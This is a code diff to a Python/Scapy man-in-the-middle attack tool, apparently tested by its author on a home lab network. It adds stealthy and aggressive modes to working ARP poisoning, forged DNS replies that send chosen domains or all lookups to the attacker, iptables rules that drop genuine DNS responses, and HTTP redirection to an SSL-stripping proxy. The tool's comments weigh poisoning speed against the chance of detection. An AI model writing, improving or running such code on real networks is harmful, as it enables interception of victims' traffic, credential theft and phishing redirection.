@@ -13,14 +13,22 @@ from collections import defaultdict
 from datetime import datetime
 
 # CONFIGURATION (ATTACKER MUST SET THESE)
-# NOTE: In a fully-fledged tool, these would come from argparse or network discovery.
-ATTACKER_IP = "192.168.88.226" # Attacker address is my VM's IP, for test purposes
-INTERFACE = "ens33" # Network interface my VM uses
-VICTIM_IP = "192.168.88.227"  # Victim address is my other laptop's IP, for test purposes
+# NOTE: In a fully-fledged tool, these will be overwritten by argparse flags.
+CONFIG = {
+    # Network Settings
+    "ATTACKER_IP": "192.168.88.226", # Attacker address is my VM's IP, for test purposes
+    "INTERFACE": "ens33", # Network interface my VM uses
+    "VICTIM_IP": "192.168.88.227", # Victim address is my other laptop's IP, for test purposes
+    
+    # Operational Mode: "SILENT" or "ALL_OUT"
+    # SILENT  = Targeted DNS spoofing (SPOOF_MAP only), Slow ARP (Stealthy)
+    # ALL_OUT = Spoof ALL DNS requests, Fast ARP (Aggressive/Noisy)
+    "MODE": "SILENT" 
+}
 
-# DNS Spoofing Map
+# DNS Spoofing Map (Used primarily in SILENT mode)
 SPOOF_MAP = {
-    "www.fakelogin.net.": ATTACKER_IP,
+    "www.fakelogin.net.": CONFIG["ATTACKER_IP"],
 }
 
 # GLOBAL VARIABLES FOR NETWORK STATE
@@ -33,7 +41,7 @@ STOP_ATTACK = False
 # SSL STRIPPING CONFIGURATION
 SSL_STRIP_PORT = 8080
 ssl_strip_server = None
-https_to_http_map = {}
+http_to_https_map = {}
 
 
 # ANALYSIS DATA STRUCTURES
@@ -232,7 +240,7 @@ def manage_iptables(action):
     # Rule: Drop packets coming FROM the Gateway (DNS Server) to the Victim on UDP port 53
     iptables_command = (
         f"sudo iptables -{action} FORWARD -p udp -s {GATEWAY_IP} --sport 53 "
-        f"-d {VICTIM_IP} -j DROP"
+        f"-d {CONFIG["VICTIM_IP"]} -j DROP"
     )
     print(f"[{action}] Executing IPTables command: {iptables_command}")
     os.system(iptables_command)
@@ -267,8 +275,8 @@ def restore_arp(victim_ip, gateway_ip, victim_mac, gateway_mac):
     gateway_restore = Ether(src=victim_mac, dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac)
     
     # Send a few times to ensure the cache is restored
-    sendp(victim_restore, count=5, iface=INTERFACE, verbose=False)
-    sendp(gateway_restore, count=5, iface=INTERFACE, verbose=False)
+    sendp(victim_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
+    sendp(gateway_restore, count=5, iface=CONFIG["INTERFACE"], verbose=False)
     print("[ARP Poison] ARP tables restored successfully.")
 
 def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
@@ -282,12 +290,17 @@ def arp_poison_loop(victim_ip, gateway_ip, victim_mac, gateway_mac):
     # Forge ARP packet to gateway pretending to be the victim. 
     gateway_packet = Ether(dst=gateway_mac)/ARP(op="is-at", psrc=victim_ip, pdst=gateway_ip, hwdst=gateway_mac)
 
+    # --- IMPLEMENTING OPERATIONAL MODES ---
+    # SILENT: Sleep 4s (Harder to detect)
+    # ALL_OUT: Sleep 0.5s (Ensures poison sticks, risking detection)
+    sleep_interval = 4 if CONFIG["MODE"] == "SILENT" else 0.5
+
     global STOP_ATTACK
     while not STOP_ATTACK:
         try:
-            sendp(victim_packet, iface=INTERFACE, verbose=False)
-            sendp(gateway_packet, iface=INTERFACE, verbose=False)
-            time.sleep(2) # Send every 2 seconds to maintain the poison
+            sendp(victim_packet, iface=CONFIG["INTERFACE"], verbose=False)
+            sendp(gateway_packet, iface=CONFIG["INTERFACE"], verbose=False)
+            time.sleep(sleep_interval) # Send every couple of seconds to maintain the poison
         except KeyboardInterrupt:
             # If a direct interrupt is caught in this thread, set the flag and break
             STOP_ATTACK = True
@@ -327,20 +340,33 @@ def dns_handler(packet):
         
     print(f"[DNS Spoof] Extracted Query Name: '{query_name}'")
 
-    # Check if the queried domain is in our SPOOF_MAP
-    if query_name in SPOOF_MAP:
-        
-        print(f"[DNS Spoof] Intercepted query for: {query_name}; FORGING REPLY...")
+    # --- IMPLEMENTING OPERATIONAL MODES ---
+    should_spoof = False
+    spoof_ip = None
+
+    if CONFIG["MODE"] == "ALL_OUT":
+        # Spoof EVERYTHING 
+        # Redirect all traffic to Attacker IP
+        if packet[DNSQR].qtype == 1: # 1 = A Record
+            should_spoof = True
+            spoof_ip = CONFIG["ATTACKER_IP"] # Always redirect to Attacker
+            
+    elif CONFIG["MODE"] == "SILENT":
+        # Only spoof targets explicitly in the map
+        if query_name in SPOOF_MAP:
+            should_spoof = True
+            spoof_ip = SPOOF_MAP[query_name]
+
+    # --- EXECUTE SPOOF ---
+    if should_spoof:
+        print(f"[DNS Spoof ({CONFIG['MODE']})] Intercepted: {query_name} -> {spoof_ip}; FORGING REPLY...")
 
         # Crafting the Spoofed Response
 
-        # Get the spoofed IP from the map
-        spoof_ip = SPOOF_MAP[query_name]
-        
         # Forge IP and UDP headers (Source and Destination IPs/Ports swapped)
         spoofed_ip = IP(src=packet[IP].dst, dst=packet[IP].src) 
         spoofed_udp = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) 
-        
+
         # Create the malicious Answer Record (DNSRR)
         spoofed_answer = DNSRR(rrname=query_name, rdata=spoof_ip)
 
@@ -349,12 +375,16 @@ def dns_handler(packet):
         
         # Packing spoofed layers
         final_packet = spoofed_ip / spoofed_udp / spoofed_dns
-        
+
         # Send the forged packet
         send(final_packet, verbose=0)
-        print(f"[DNS Spoof] SENT SPOOFED REPLY: {query_name} -> {spoof_ip}")
-    else:
-        print(f"[DNS Spoof] Domain '{query_name}' NOT in SPOOF_MAP. Ignoring.")
+        print(f"[DNS Spoof ({CONFIG['MODE']})] SENT SPOOFED REPLY: {query_name} -> {spoof_ip}")
+        
+    elif CONFIG["MODE"] == "SILENT":
+        # Only print ignored domains in silent mode for debugging
+        # In ALL_OUT, we spoof everything so this will be hit only in SILENT mode, when domain is not a target
+        print(f"[DNS Spoof ({CONFIG['MODE']})] Domain '{query_name}' NOT in SPOOF_MAP. Ignoring due to Silent Mode.")
+        
 
 def stop_sniffing(packet):
     """Callback function for Scapy's sniff to check the global stop flag."""
@@ -365,13 +395,13 @@ def stop_sniffing(packet):
 def start_dns_spoofing():
     """Starts the continuous sniffing thread for DNS traffic."""
     
-    print(f"[DNS Spoof] Starting DNS sniffer on interface {INTERFACE}")
+    print(f"[DNS Spoof] Starting DNS sniffer on interface {CONFIG["INTERFACE"]}")
     
     # The filter ensures we only catch UDP traffic on port 53 (DNS)
     sniff_thread = threading.Thread(
         target=sniff, 
         kwargs={
-            'iface': INTERFACE, 
+            'iface': CONFIG["INTERFACE"], 
             'filter': "udp and port 53", 
             'prn': dns_handler,
             'store': 0, 
@@ -538,7 +568,7 @@ def setup_ssl_strip_iptables():
     """Configure iptables to redirect only HTTP traffic."""
     redirect_cmd = (
         f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 "
-        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+        f"-s {CONFIG["VICTIM_IP"]} -j REDIRECT --to-port {SSL_STRIP_PORT}"
     )
     print(f"[SSL Strip] Redirecting HTTP (port 80) to proxy")
     os.system(redirect_cmd)
@@ -547,7 +577,7 @@ def cleanup_ssl_strip_iptables():
     """Remove SSL stripping iptables rules."""
     remove_cmd = (
         f"sudo iptables -t nat -D PREROUTING -p tcp --dport 80 "
-        f"-s {VICTIM_IP} -j REDIRECT --to-port {SSL_STRIP_PORT}"
+        f"-s {CONFIG["VICTIM_IP"]} -j REDIRECT --to-port {SSL_STRIP_PORT}"
     )
     os.system(remove_cmd)
 
@@ -568,19 +598,19 @@ def stop_ssl_strip():
 def setup_and_run():
     global VICTIM_MAC, GATEWAY_IP, GATEWAY_MAC
 
-    print(f"[*] Starting MITM Attack on Victim: {VICTIM_IP}")
+    print(f"[*] Starting MITM Attack [{CONFIG['MODE']} MODE] on Victim: {CONFIG["VICTIM_IP"]}")
 
     # Gather network details
     GATEWAY_IP = find_gateway()
     GATEWAY_MAC = find_mac(GATEWAY_IP)
-    VICTIM_MAC = find_mac(VICTIM_IP)
+    VICTIM_MAC = find_mac(CONFIG["VICTIM_IP"])
 
     if not all([GATEWAY_MAC, VICTIM_MAC]):
         print("[!] ERROR: Could not find MAC addresses for victim or gateway. Exiting.")
         sys.exit(1)
 
     print(f"[ARP Poison] The gateway of this network is at IP address {GATEWAY_IP} and MAC address {GATEWAY_MAC}.")
-    print(f"[ARP Poison] The victim at IP address {VICTIM_IP} is at MAC address {VICTIM_MAC}.")
+    print(f"[ARP Poison] The victim at IP address {CONFIG["VICTIM_IP"]} is at MAC address {VICTIM_MAC}.")
 
     # Enable IP Forwarding (Critical for MiTM)
     # The attacker machine needs to forward the packets between gateway and victim.
@@ -593,7 +623,7 @@ def setup_and_run():
 
     # Start ARP Poisoning thread
     arp_thread = threading.Thread(target=arp_poison_loop, 
-        args=(VICTIM_IP, GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
+        args=(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC))
     arp_thread.daemon = True
     arp_thread.start()
     print("[ARP Poison] ARP Poisoning started. MiTM position established.")
@@ -632,7 +662,7 @@ def cleanup():
     
     # Restore ARP tables
     if GATEWAY_IP and VICTIM_MAC:
-        restore_arp(VICTIM_IP, GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
+        restore_arp(CONFIG["VICTIM_IP"], GATEWAY_IP, VICTIM_MAC, GATEWAY_MAC)
     
     # REMOVE the DNS Response Dropping Rule
     manage_iptables('D') # Delete the DROP rule
